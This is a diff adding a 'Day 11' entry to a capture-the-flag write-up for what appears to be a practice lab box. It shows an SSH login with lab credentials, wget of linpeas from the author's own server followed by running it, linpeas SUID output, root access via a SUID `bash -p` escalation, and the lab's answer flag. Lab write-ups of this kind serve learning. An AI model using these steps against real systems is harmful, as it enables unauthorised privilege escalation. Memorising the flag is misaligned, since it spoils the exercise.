@@ -614,6 +614,85 @@ enum4linux complete on Sun Dec 20 11:07:44 2020
 	* There's an empty directory called `jingle-tunes`
 	* Unfortunately, it doesn't look like there's anything interesting here
 # Day 11
+* SSH into the box with `ssh cmnatic@10.10.138.250` and the password `aoc2020`
+* It looks like the box isn't connected to the internet, which means we need another way to upload enumeration scripts (I'll be using linpeas)
+
+* Set up a simple file server with `python -m SimpleHTTPServer 80` in the same directory as the file
+	* My ip is `10.6.36.105`, so we can use `wget "http://10.6.36.105/linpeas.sh"` on the box to download the file
+
+* Change file permissions with `chmod +x linpeas.sh` and run with `./linpeas.sh`
+* There's a ton of output, but the key at the top indicates we should be looking for stuff highlighted in red
+	* Here's some of that output:
+
+```
+[+] Searching Keyring files
+Keyring folder: /usr/share/keyrings
+/usr/share/keyrings:
+
+...
+
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping6
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/10444/bin/ping6
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/10444/bin/ping
+-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/7270/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/7270/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/10444/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/10444/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/10444/usr/bin/chsh
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/10444/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/bin/su
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/10444/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/10444/bin/su
+-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+-rwsr-xr-x 1 root   root             27K May 15  2019 /snap/core/7270/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root   root             40K May 15  2019 /snap/core/7270/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root   root            1.1M Jun  6  2019 /bin/bash
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            134K Jun 10  2019 /snap/core/7270/usr/bin/sudo  --->  /sudo$
+-rwsr-sr-x 1 root   root            101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/10444/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/10444/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root   root            146K Jan 31  2020 /usr/bin/sudo  --->  /sudo$
+-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/10444/usr/bin/sudo  --->  /sudo$
+-rwsr-xr-x 1 root   root            419K May 26  2020 /snap/core/10444/usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root   messagebus       42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/10444/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            111K Jul 10 14:00 /usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Jul 23 15:09 /snap/core/10444/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root   root             27K Sep 16 18:43 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root   root             43K Sep 16 18:43 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root   root            109K Nov 19 17:07 /snap/core/10444/usr/lib/snapd/snap-confine
+
+```
+* Bash having suid is very dangerous
+* [gtfobins](https://gtfobins.github.io/gtfobins/bash/) writes that "If the [bash] binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges."
+	* Thus, we can run `bash -p` to enter privileged mode, which gives us root
+
+* Now we can `cd /root/` and `cat flag.txt` to get the flag: `thm{2fb10afe933296592}`
 
 # Day 12
 
